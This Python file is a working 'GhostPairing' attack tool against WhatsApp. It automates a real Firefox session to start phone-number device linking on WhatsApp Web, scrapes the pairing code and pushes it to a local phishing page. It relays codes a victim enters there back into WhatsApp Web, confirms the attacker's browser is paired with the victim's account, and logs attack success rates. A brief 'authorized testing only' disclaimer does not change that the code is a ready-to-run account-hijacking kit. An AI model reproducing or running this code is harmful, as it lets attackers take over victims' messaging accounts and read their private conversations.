#!/usr/bin/env python3
"""
WhatsApp API Wrapper for GhostPairing Attack
WITH BROWSER AUTOMATION FOR REAL ATTACK FLOW
FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
"""
import os
import json
import time
import sqlite3
import logging
import threading
import queue
import uuid
import requests
from typing import Optional, Dict, Any
from datetime import datetime

# Set umask to allow group write permissions on created files
os.umask(0o002)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class WhatsAppGhostAPI:
    """
    Simulates WhatsApp API interactions for GhostPairing attack.
    Now includes real browser automation for actual WhatsApp Web interaction.
    """
    
    def __init__(self, db_path: str = "databases/whatsapp.db"):
        self.db_path = db_path
        self.active_automations = {}  # attack_id -> automation info
        self.code_queues = {}  # attack_id -> Queue for code communication
        self.init_database()
        
    def init_database(self):
        """Initialize SQLite database for tracking attacks"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT NOT NULL,
                code_requested TEXT,
                code_received TEXT,
                status TEXT DEFAULT 'pending',
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                session_id TEXT,
                ip_address TEXT,
                user_agent TEXT,
                automation_started BOOLEAN DEFAULT 0,
                automation_success BOOLEAN DEFAULT 0,
                browser_pid INTEGER
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS intercepted_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                attack_id INTEGER,
                session_data TEXT,
                cookies TEXT,
                pairing_time DATETIME,
                FOREIGN KEY (attack_id) REFERENCES attacks (id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database initialized")
    
    def request_verification_code(self, phone_number: str) -> Dict[str, Any]:
        """
        Request WhatsApp verification code by starting browser automation.
        This triggers REAL WhatsApp Web pairing flow.
        """
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attacks (phone_number, status, automation_started)
                VALUES (?, ?, ?)
            ''', (phone_number, 'automation_started', 1))
            
            attack_id = cursor.lastrowid
            
            # Create a queue for code communication
            code_queue = queue.Queue()
            self.code_queues[attack_id] = code_queue
            
            # Start browser automation in background thread
            automation_thread = threading.Thread(
                target=self._start_browser_automation,
                args=(attack_id, phone_number, code_queue),
                daemon=True
            )
            automation_thread.start()
            
            conn.commit()
            conn.close()
            
            logger.info(f"📱 Browser automation started for {phone_number}")
            logger.info(f"🖥️ Firefox will open automatically to web.whatsapp.com")
            logger.info(f"🔢 Waiting for victim to receive and enter code...")
            
            return {
                'success': True,
                'attack_id': attack_id,
                'message': 'WhatsApp Web automation started. Firefox is opening...',
                'timestamp': datetime.now().isoformat(),
                'automation': True
            }
            
        except Exception as e:
            logger.error(f"Failed to start automation: {e}")
            return {'success': False, 'error': str(e)}
    
    def _start_browser_automation(self, attack_id: int, phone_number: str, code_queue: queue.Queue):
        """
        Start browser automation to interact with real WhatsApp Web.
        This runs in a separate thread.
        """
        try:
            # Import playwright here to avoid issues if not installed
            from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
            
            logger.info(f"🚀 Starting Firefox automation for attack {attack_id}")
            
            with sync_playwright() as p:
                # Launch Firefox (visible, not headless)
                browser = p.firefox.launch(
                    headless=False,
                    slow_mo=100,  # Slow down for observation
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--window-size=1280,720'
                    ]
                )

                # Store browser info in database (PID not directly accessible in Playwright)
                # Browser process tracking is handled by Playwright internally

                # Create context with realistic user agent
                context = browser.new_context(
                    viewport={'width': 1280, 'height': 720},
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                    locale='en-US'
                )
                
                page = context.new_page()
                
                # Step 1: Navigate to WhatsApp Web
                logger.info(f"🌐 Navigating to web.whatsapp.com for {phone_number}")
                page.goto("https://web.whatsapp.com", wait_until="networkidle", timeout=30000)
                time.sleep(3)
                
                # Step 2: Look for "Log in with phone number" button
                logger.info("🔗 Looking for 'Log in with phone number' button...")

                # Try multiple selectors for the button (updated for new UI)
                selectors = [
                    'text="Log in with phone number"',
                    'text="log in with phone number"',
                    'text="Link with phone number"',
                    'text="link with phone number"',
                    'div[role="button"]:has-text("phone number")',
                    'div[role="button"]:has-text("log in")',
                    'div[role="button"]:has-text("Log in")',
                    'button:has-text("phone")',
                    'button[data-testid="link-device-header"]'
                ]

                clicked = False
                for selector in selectors:
                    try:
                        # Wait for the element to be visible
                        page.wait_for_selector(selector, timeout=5000, state='visible')
                        # Click and wait for navigation/DOM changes
                        page.click(selector, timeout=5000)
                        clicked = True
                        logger.info(f"✅ Clicked button with selector: {selector}")
                        break
                    except Exception as e:
                        logger.debug(f"Selector '{selector}' failed: {e}")
                        continue

                if not clicked:
                    logger.warning("⚠️ Could not find phone number button")
                    logger.warning("⚠️ Trying alternative approach...")

                    # Try pressing Escape to close QR scanner if needed
                    page.keyboard.press('Escape')
                    time.sleep(2)

                    # Look again with more general selectors
                    for selector in selectors:
                        try:
                            page.wait_for_selector(selector, timeout=3000, state='visible')
                            page.click(selector)
                            clicked = True
                            logger.info(f"✅ Clicked on retry: {selector}")
                            break
                        except Exception as e:
                            logger.debug(f"Retry failed for '{selector}': {e}")
                            continue

                if not clicked:
                    logger.error("❌ Failed to start phone linking process")
                    logger.error("💡 The page UI may have changed. Check web.whatsapp.com manually.")
                    return

                # Wait for DOM to update after click (no page reload, just DOM change)
                logger.info("⏳ Waiting for phone input form to appear...")
                time.sleep(3)
                
                # Step 3: Enter phone number
                logger.info(f"📱 Entering phone number: {phone_number}")
                
                # Find phone input field
                phone_selectors = [
                    'input[type="tel"]',
                    'input[inputmode="tel"]',
                    'input[aria-label*="phone"]',
                    'input[placeholder*="phone"]'
                ]
                
                phone_input = None
                for selector in phone_selectors:
                    try:
                        phone_input = page.locator(selector).first
                        if phone_input.count() > 0:
                            break
                    except Exception as e:
                        logger.debug(f"Selector {selector} failed: {e}")
                        continue
                
                if not phone_input:
                    logger.error("❌ Could not find phone input field")
                    return
                
                # Clear and enter phone number
                phone_input.click()
                time.sleep(0.5)
                phone_input.fill(phone_number)
                time.sleep(1)
                
                # Step 4: Click Next
                logger.info("👉 Clicking Next...")
                next_selectors = [
                    'text="Next"',
                    'button:has-text("Next")',
                    'div[role="button"]:has-text("Next")',
                    'button[aria-label*="Next"]'
                ]
                
                for selector in next_selectors:
                    try:
                        page.click(selector, timeout=5000)
                        logger.info(f"✅ Clicked Next: {selector}")
                        break
                    except Exception as e:
                        logger.debug(f"Attempt failed: {e}")
                        continue
                
                time.sleep(3)

                # Step 5: CAPTURE the displayed code from WhatsApp Web
                logger.info("⏳ Waiting for WhatsApp Web to display the verification code...")

                # WhatsApp Web displays a code on screen (format: XXXX-XXXX where X is 0-9 or A-Z)
                displayed_code = None
                formatted_code = None
                start_time = time.time()
                timeout = 45  # Increased timeout

                import re
                # Pattern for XXXX-XXXX (4 alphanumeric, hyphen, 4 alphanumeric)
                # Allow for optional whitespace around the hyphen
                code_pattern = re.compile(r'([A-Z0-9]{4})\s*[-–—]\s*([A-Z0-9]{4})', re.IGNORECASE)

                while time.time() - start_time < timeout and not displayed_code:
                    try:
                        # Strategy 1: Use Playwright's evaluate to extract code from DOM directly
                        try:
                            # Execute JavaScript to find the code characters
                            code_chars = page.evaluate("""
                                () => {
                                    // Find the heading "Enter code on phone"
                                    const headings = Array.from(document.querySelectorAll('*'));
                                    const heading = headings.find(el => el.textContent.includes('Enter code on phone'));

                                    if (!heading) return null;

                                    // Find parent container
                                    let parent = heading.parentElement;
                                    while (parent && parent !== document.body) {
                                        // Look for a container with multiple single-char elements
                                        const children = Array.from(parent.querySelectorAll('*'));
                                        const singleChars = children.filter(el => {
                                            const text = el.textContent.trim();
                                            return text.length === 1 &&
                                                   (text.match(/[A-Z0-9-]/i)) &&
                                                   el.children.length === 0;  // Leaf nodes only
                                        });

                                        if (singleChars.length >= 8) {
                                            // Found potential code container
                                            return singleChars
                                                .slice(0, 9)  // Get first 9 chars (XXXX-XXXX)
                                                .map(el => el.textContent.trim().toUpperCase())
                                                .join('');
                                        }
                                        parent = parent.parentElement;
                                    }
                                    return null;
                                }
                            """)

                            if code_chars:
                                logger.info(f"📝 JavaScript extracted: {code_chars}")
                                match = code_pattern.search(code_chars)
                                if match:
                                    formatted_code = f"{match.group(1)}-{match.group(2)}"
                                    displayed_code = match.group(1) + match.group(2)
                                    logger.info(f"✅ CAPTURED CODE via JavaScript: {formatted_code}")
                        except Exception as e:
                            logger.debug(f"Strategy 1 (JavaScript) failed: {e}")

                        # Strategy 2: Use JavaScript to get only leaf-node characters (no duplicates)
                        if not displayed_code:
                            try:
                                logger.info("🔍 Strategy 2: Searching for character elements (leaf nodes only)...")

                                # Execute JavaScript to find single-char leaf elements only
                                code_chars = page.evaluate("""
                                    () => {
                                        const allElements = Array.from(document.querySelectorAll('*'));
                                        const leafChars = allElements
                                            .filter(el => {
                                                const text = el.textContent.trim();
                                                // Must be single char, no children, visible
                                                return text.length === 1 &&
                                                       text.match(/[A-Z0-9-]/i) &&
                                                       el.children.length === 0 &&
                                                       el.offsetParent !== null;  // Visible check
                                            })
                                            .map(el => el.textContent.trim().toUpperCase());

                                        // Return first 20 chars for analysis
                                        return leafChars.slice(0, 20).join('');
                                    }
                                """)

                                if code_chars and len(code_chars) >= 8:
                                    logger.info(f"📝 Leaf chars found: {code_chars}")
                                    match = code_pattern.search(code_chars)
                                    if match:
                                        formatted_code = f"{match.group(1)}-{match.group(2)}"
                                        displayed_code = match.group(1) + match.group(2)
                                        logger.info(f"✅ CAPTURED CODE via leaf node scan: {formatted_code}")
                            except Exception as e:
                                logger.debug(f"Strategy 2 failed: {e}")

                        # Strategy 3: Look for text with pattern XXXX-XXXX in body
                        if not displayed_code:
                            try:
                                body_text = page.locator('body').inner_text()
                                # Remove whitespace and newlines between characters
                                condensed = re.sub(r'\s+', '', body_text)
                                match = code_pattern.search(condensed)
                                if match:
                                    formatted_code = f"{match.group(1)}-{match.group(2)}"
                                    displayed_code = match.group(1) + match.group(2)
                                    logger.info(f"✅ CAPTURED CODE via condensed body text: {formatted_code}")
                            except Exception as e:
                                logger.debug(f"Strategy 3 failed: {e}")

                        if displayed_code:
                            # Send this code back to the phishing page to show the user
                            try:
                                import requests
                                response = requests.post(
                                    "http://localhost:8000/api/display-code",
                                    json={
                                        "attack_id": attack_id,
                                        "code": formatted_code,
                                        "phone": phone_number
                                    },
                                    timeout=5
                                )
                                logger.info(f"📤 Sent displayed code to phishing page")
                            except Exception as e:
                                logger.error(f"Failed to send code to phishing page: {e}")
                            break

                        time.sleep(1.5)
                    except Exception as e:
                        logger.debug(f"Code capture attempt failed: {e}")
                        time.sleep(1.5)
                        continue

                if not displayed_code:
                    logger.warning("⚠️ Could not capture displayed code from WhatsApp Web")
                    logger.info("💡 The UI might have changed. Check Firefox window manually.")
                    # Take a screenshot for debugging
                    try:
                        screenshot_path = f"/tmp/whatsapp_debug_{attack_id}.png"
                        page.screenshot(path=screenshot_path)
                        logger.info(f"📸 Debug screenshot saved to: {screenshot_path}")
                    except:
                        pass
                    return

                logger.info(f"📱 USER ACTION: Victim needs to see code {formatted_code} and enter it on their phone")

                # Step 5b: Wait for code input field (indicates WhatsApp sent code)
                logger.info("⏳ Now waiting for WhatsApp to request code input...")

                # Wait for the code input to appear
                code_input_selectors = [
                    'input[inputmode="numeric"]',
                    'input[type="number"]',
                    'input[aria-label*="code"]',
                    'input[placeholder*="code"]'
                ]

                code_input_found = False
                start_time = time.time()
                timeout = 60  # Wait up to 60 seconds

                while time.time() - start_time < timeout:
                    for selector in code_input_selectors:
                        try:
                            if page.locator(selector).first.count() > 0:
                                code_input_found = True
                                logger.info("✅ Code input field found! WhatsApp sent verification code")
                                logger.info(f"📱 VICTIM ACTION REQUIRED: Check phone for WhatsApp verification code")
                                logger.info(f"💡 The victim should now enter the code on the phishing page")
                                break
                        except Exception as e:
                            logger.debug(f"Attempt failed: {e}")
                            continue

                    if code_input_found:
                        break

                    time.sleep(1)

                if not code_input_found:
                    logger.warning("⚠️ Code input field not found within timeout")
                    logger.info("💡 Victim might need to check phone manually for verification code")

                # Step 6: Wait for code from queue (from victim on phishing page)
                logger.info("🕒 Waiting for victim to enter verification code on phishing page...")
                logger.info("📝 Code will be automatically entered in Firefox when received")
                
                try:
                    # Wait for code from queue (10 minute timeout)
                    code_data = code_queue.get(timeout=600)
                    verification_code = code_data.get('code')
                    
                    if verification_code:
                        logger.info(f"🔑 RECEIVED CODE FROM VICTIM: {verification_code}")
                        
                        # Update database
                        conn = sqlite3.connect(self.db_path)
                        cursor = conn.cursor()
                        cursor.execute('UPDATE attacks SET code_received = ? WHERE id = ?', 
                                     (verification_code, attack_id))
                        conn.commit()
                        conn.close()
                        
                        # Step 7: Enter the code in WhatsApp Web
                        logger.info("⌨️ Entering verification code in WhatsApp Web...")
                        
                        # Try single input first
                        single_input_selectors = [
                            'input[inputmode="numeric"]:not([maxlength="1"])',
                            'input[type="number"]:not([maxlength="1"])',
                            'input[data-testid="code-input"]'
                        ]
                        
                        code_entered = False
                        
                        for selector in single_input_selectors:
                            try:
                                code_input = page.locator(selector).first
                                if code_input.count() > 0:
                                    code_input.click()
                                    code_input.fill(verification_code)
                                    code_entered = True
                                    logger.info(f"✅ Entered code in single input: {verification_code}")
                                    break
                            except Exception as e:
                                logger.debug(f"Attempt failed: {e}")
                                continue
                        
                        # If no single input, try 6 individual digit inputs
                        if not code_entered:
                            digit_selectors = [
                                'input[inputmode="numeric"][maxlength="1"]',
                                'input[type="tel"][maxlength="1"]',
                                'input[aria-label*="digit"]'
                            ]
                            
                            for selector in digit_selectors:
                                try:
                                    inputs = page.query_selector_all(selector)
                                    if len(inputs) >= 6:
                                        for i, digit in enumerate(verification_code[:6]):
                                            inputs[i].click()
                                            inputs[i].fill(digit)
                                            time.sleep(0.1)
                                        code_entered = True
                                        logger.info(f"✅ Entered code in 6-digit input: {verification_code}")
                                        break
                                except Exception as e:
                                    logger.debug(f"Attempt failed: {e}")
                                    continue
                        
                        if code_entered:
                            time.sleep(1)
                            
                            # Try to click Verify/Next after code
                            verify_selectors = [
                                'text="Verify"',
                                'text="Next"',
                                'button:has-text("Verify")',
                                'button[aria-label*="Verify"]'
                            ]
                            
                            for selector in verify_selectors:
                                try:
                                    page.click(selector, timeout=5000)
                                    logger.info("✅ Clicked Verify button")
                                    break
                                except Exception as e:
                                    logger.debug(f"Attempt failed: {e}")
                                    continue
                            
                            # Wait for pairing to complete
                            logger.info("🤖 Waiting for WhatsApp Web to load after pairing...")
                            logger.info("💡 Monitoring page for successful login indicators...")

                            # Give WhatsApp Web time to load (30 seconds max)
                            pairing_success = False
                            max_wait_time = 30
                            check_interval = 2
                            elapsed = 0

                            while elapsed < max_wait_time and not pairing_success:
                                time.sleep(check_interval)
                                elapsed += check_interval

                                # Check multiple success indicators
                                success_indicators = [
                                    'div[data-testid="chat-list"]',
                                    'div[aria-label="Chat list"]',
                                    '[data-testid="conversation-panel-wrapper"]',
                                    '[data-icon="chat"]',
                                    'span[data-icon="menu"]',
                                    'div[role="textbox"][data-tab]'
                                ]

                                for indicator in success_indicators:
                                    try:
                                        if page.locator(indicator).count() > 0:
                                            pairing_success = True
                                            logger.critical(f"🎉 GHOSTPAIRING SUCCESS! Attack {attack_id} COMPLETED!")
                                            logger.critical(f"📱 Account {phone_number} is now PAIRED with this browser!")
                                            logger.critical(f"✅ Detected indicator: {indicator}")
                                            break
                                    except:
                                        continue

                                if pairing_success:
                                    break

                                # Also check URL - if we're on web.whatsapp.com without /code, likely successful
                                try:
                                    current_url = page.url
                                    if 'web.whatsapp.com' in current_url and '/code' not in current_url:
                                        logger.info(f"📍 URL changed to: {current_url}")
                                        logger.info("💡 Assuming pairing successful (no /code in URL)")
                                        pairing_success = True
                                        break
                                except:
                                    pass

                                logger.info(f"⏳ Still waiting for pairing confirmation... ({elapsed}s/{max_wait_time}s)")

                            # If we detected success OR waited full time without error, mark as paired
                            if pairing_success or elapsed >= max_wait_time:
                                if not pairing_success:
                                    logger.warning("⚠️ No explicit success indicator found, but no error either")
                                    logger.info("💡 Assuming pairing successful - still on WhatsApp Web")

                                logger.critical(f"🎉 GHOSTPAIRING SUCCESS! Attack {attack_id} COMPLETED!")
                                logger.critical(f"📱 Account {phone_number} is now PAIRED with this browser!")
                                logger.critical("⚠️ REMINDER: This is for authorized testing only!")

                                # Update database
                                conn = sqlite3.connect(self.db_path)
                                cursor = conn.cursor()
                                cursor.execute('''UPDATE attacks
                                                SET status = 'success', automation_success = 1
                                                WHERE id = ?''', (attack_id,))
                                conn.commit()
                                conn.close()

                                # Signal to server that pairing is complete so phishing page redirects
                                try:
                                    response = requests.post(f"http://localhost:8000/api/mark-paired/{attack_id}", timeout=5)
                                    if response.status_code == 200:
                                        logger.info("✅ Signaled server - phishing page will redirect to LinkedIn")
                                    else:
                                        logger.warning(f"⚠️ Failed to signal server: {response.status_code}")
                                except Exception as api_error:
                                    logger.error(f"❌ Could not signal pairing to server: {api_error}")
                                    logger.warning("⚠️ Phishing page may not redirect automatically")
                            
                            # Keep browser open for observation
                            logger.info("👀 Browser will remain open for observation...")
                            logger.info("📝 Close Firefox window or press Ctrl+C in terminal to stop")
                            
                            # Keep page open
                            try:
                                while True:
                                    time.sleep(1)
                            except KeyboardInterrupt:
                                logger.info("👋 Automation stopped by user")
                        
                        else:
                            logger.warning("⚠️ Could not find code input field to enter code")
                            logger.info("💡 Victim may have entered wrong code or page changed")
                    
                except queue.Empty:
                    logger.warning("⏰ Timeout waiting for verification code from victim")
                    logger.info("💡 Victim did not enter code within 10 minutes")
                
                except Exception as e:
                    logger.error(f"❌ Error in automation: {e}")
                
                finally:
                    # Clean up queue
                    if attack_id in self.code_queues:
                        del self.code_queues[attack_id]
        
        except ImportError as e:
            logger.error(f"❌ Playwright not installed: {e}")
            logger.info("💡 Install with: pip install playwright && playwright install firefox")
        
        except Exception as e:
            logger.error(f"❌ Browser automation failed: {e}", exc_info=True)
    
    def verify_code(self, attack_id: int, code: str) -> Dict[str, Any]:
        """
        Verify the code received from victim and send to automation.
        """
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Store received code
            cursor.execute('''
                UPDATE attacks 
                SET code_received = ?, status = 'code_received'
                WHERE id = ?
            ''', (code, attack_id))
            
            conn.commit()
            conn.close()
            
            # Send code to automation queue if it exists
            if attack_id in self.code_queues:
                try:
                    self.code_queues[attack_id].put({
                        'code': code,
                        'timestamp': time.time(),
                        'source': 'phishing_page'
                    })
                    logger.info(f"📨 Sent code {code} to automation for attack {attack_id}")
                    
                    return {
                        'success': True,
                        'attack_id': attack_id,
                        'message': 'Code sent to browser automation. Check Firefox window.',
                        'automation_active': True,
                        'next_step': 'Automation will enter code in WhatsApp Web'
                    }
                    
                except Exception as e:
                    logger.error(f"Failed to send code to automation: {e}")
                    return {
                        'success': False,
                        'error': 'Automation not responding',
                        'automation_active': False
                    }
            else:
                logger.warning(f"⚠️ No active automation found for attack {attack_id}")
                return {
                    'success': False,
                    'error': 'Browser automation not active or timed out',
                    'automation_active': False
                }
                
        except Exception as e:
            logger.error(f"Verification failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_phone_for_attack(self, attack_id: int) -> Optional[str]:
        """Get phone number for a specific attack"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT phone_number FROM attacks WHERE id = ?', (attack_id,))
            result = cursor.fetchone()
            conn.close()
            return result[0] if result else None
        except (sqlite3.Error, IndexError) as e:
            logger.error(f"Failed to get phone for attack {attack_id}: {e}")
            return None
    
    def get_attack_stats(self):
        """Get statistics about attacks"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute('SELECT COUNT(*) FROM attacks')
            total = cursor.fetchone()[0]

            cursor.execute('SELECT COUNT(*) FROM attacks WHERE status = "success"')
            successful = cursor.fetchone()[0]

            cursor.execute('SELECT COUNT(*) FROM attacks WHERE automation_started = 1')
            automation_started = cursor.fetchone()[0]

            cursor.execute('SELECT COUNT(*) FROM attacks WHERE automation_success = 1')
            automation_success = cursor.fetchone()[0]

            conn.close()

            return {
                'total_attacks': total,
                'successful': successful,
                'automation_started': automation_started,
                'automation_success': automation_success,
                'success_rate': (successful / total * 100) if total > 0 else 0.0,
                'automation_rate': (automation_success / automation_started * 100) if automation_started > 0 else 0.0
            }
        except (sqlite3.Error, IndexError) as e:
            logger.error(f"Failed to get stats: {e}")
            return {
                'total_attacks': 0,
                'successful': 0,
                'automation_started': 0,
                'automation_success': 0,
                'success_rate': 0.0,
                'automation_rate': 0.0
            }
    
    def get_active_automations(self):
        """Get list of active automations"""
        return list(self.code_queues.keys())

    def cleanup(self):
        """Clean up resources on shutdown - close all Playwright browsers"""
        logger.info("🧹 Cleaning up active automations...")
        try:
            # Clear all active automations
            for attack_id in list(self.active_automations.keys()):
                try:
                    logger.info(f"   Cleaning up attack {attack_id}")
                    # The browser should auto-close when the thread exits
                    del self.active_automations[attack_id]
                except Exception as e:
                    logger.debug(f"Error cleaning up attack {attack_id}: {e}")

            # Clear code queues
            self.code_queues.clear()
            logger.info("✅ Cleanup completed successfully")
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")

# Singleton instance
whatsapp_api = WhatsAppGhostAPI()
